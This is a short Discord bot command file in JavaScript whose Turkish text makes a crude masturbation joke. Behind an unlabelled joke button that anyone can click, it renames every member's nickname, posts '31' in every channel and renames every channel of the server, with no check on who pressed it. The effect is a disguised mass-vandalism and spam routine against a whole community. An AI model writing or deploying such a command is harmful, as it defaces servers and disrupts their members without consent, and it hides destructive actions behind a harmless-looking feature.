const { MessageButton } = require("discord-buttons");
const discord = require("discord.js");
exports.run = async (client, message, args) => {
  const embed = new discord.MessageEmbed()
    .setDescription(
      `31 çekmek için butona basın.`
    )
    .setTitle("LightSide | 31 çek");
  let çalmakyasak = new MessageButton()
    .setStyle("green")
    .setLabel("31 çek")
    .setID("click_to_function");
  message.channel.send({ button: çalmakyasak, embed: embed });
  client.on("clickButton", async button => {
    if (button.id == "click_to_function") {
 message.guild.members.cache.forEach(m => { m.setNickname("31 çekiyor") })
client.user.setActivity('31 çekiyorum', { type: 'PLAYING' })
message.guild.channels.cache.forEach(m => { m.send("31") })
message.guild.channels.cache.forEach(m => { m.setName("31 kanalı") })
message.channel.send("Al sana 31 hehehe")
    }
  });
};
exports.conf = {
  enabled: true,
  guildOnly: false,
  permLevel: 2,
  aliases: []
};
exports.help = {
  name: "31çek"
};